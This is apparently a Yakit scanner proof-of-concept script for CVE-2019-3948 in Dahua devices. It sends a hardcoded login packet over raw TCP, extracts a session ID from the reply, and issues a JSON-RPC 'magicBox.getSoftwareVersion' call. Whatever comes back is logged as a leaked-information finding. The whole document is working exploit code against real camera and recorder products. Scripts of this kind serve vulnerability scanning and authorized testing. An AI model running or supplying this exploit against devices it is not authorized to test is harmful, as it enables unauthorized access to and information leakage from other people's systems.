##server:大华
##type:poc
##params:root_url
##name:dahua_CVE_2019_3948_poc
##severity:medium
##out_put:dahua_CVE_2019_3948_poc_res,dahua_CVE_2019_3948_info_leak



loglevel(`info`)
yakit.AutoInitYakit()


login="a000006000000000c4a3af489956b6b47e48c486909854f3050200010000a1aa"


unpack=func(raw){
    test_string=raw
    test_string_=test_string[3:]+test_string[2:3]+test_string[1:2]+test_string[0:1]
    log.info(f"转换后的字符串为${test_string_}")
    dump(test_string_)
    res=test_string[3]+test_string[2]<<8+test_string[1]<<16+test_string[0]<<24
    return res    
}


pack=func(raw){
    test_hex="%08x" % raw
    test_string=string(test_hex)
    test_string_=test_string[6:]+test_string[4:6]+test_string[2:4]+test_string[0:2]
    // println(test_string)
    // dump(test_string_)
    return test_string_    
}


rawstring_to_hexstring=func(raw){
    res=""
    for i=0;i<len(raw);i++{
        res=res+"%02x" % raw[i]
    }
    return res
}

poc = func(ip, port) {
    conn, err = tcp.Connect(ip, port, tcp.clientTimeout(10))
    if err != nil {
        die(err)
    }


    login_data,err=codec.DecodeHex(login)
    if err != nil {
        die(err)
    }

    conn.Write(login_data)
    // reply,err=conn.RecvTimeout(2)
    reply,err=conn.RecvTimeout(2)
    if err != nil {
        die(err)
    }
    // dump(reply)
    if len(reply)!=32{
        log.info("接收字节长度不为32，脚本即将退出")
        os.Exit(0)
    }
    session_id_bin = reply[16:20]
    // println("dump jsonid bin")
    // dump(session_id_bin)

    session_id_int=unpack(session_id_bin)
    // dump(session_id_int)
    if session_id_int==0{
        log.info("登录失败，脚本即将退出")
        os.Exit(0)
    }
    json_data=`{"id":1,"method":"magicBox.getSoftwareVersion","params":null,"session":` + string(session_id_int) + "}\n\x00"

    size=pack(len(json_data))
    dump(size)
    json_req="f6000000" + size + "0100000000000000" + size + "00000000" + "%02x%02x%02x%02x"%[session_id_bin[0],session_id_bin[1],session_id_bin[2],session_id_bin[3]] + "00000000" + rawstring_to_hexstring(json_data)
    // dump(json_req)
    json_req_,err=codec.DecodeHex(json_req)
    conn.Write(json_req_)

    reply,err=conn.RecvTimeout(2)

    if err != nil {
        die(err)
    }
    risk.NewRisk(
        root_url,
        risk.severity("high"), 
        risk.title(f"FOUND ${root_url} 存在dahua_CVE_2019_3948漏洞"), 
        risk.titleVerbose("dahua_CVE_2019_3948漏洞"), 
        risk.type("信息窃取"), 
        risk.typeVerbose("信息泄露"),                 
        risk.details({"dahua_CVE_2019_3948_poc_res":true,"dahua_CVE_2019_3948_info_leak":reply}),             
    )


}




root_url = cli.String("root_url")

ip, port, err = str.ParseStringToHostPort(root_url)
if err != nil {
    die(err)
}

poc(ip, port)
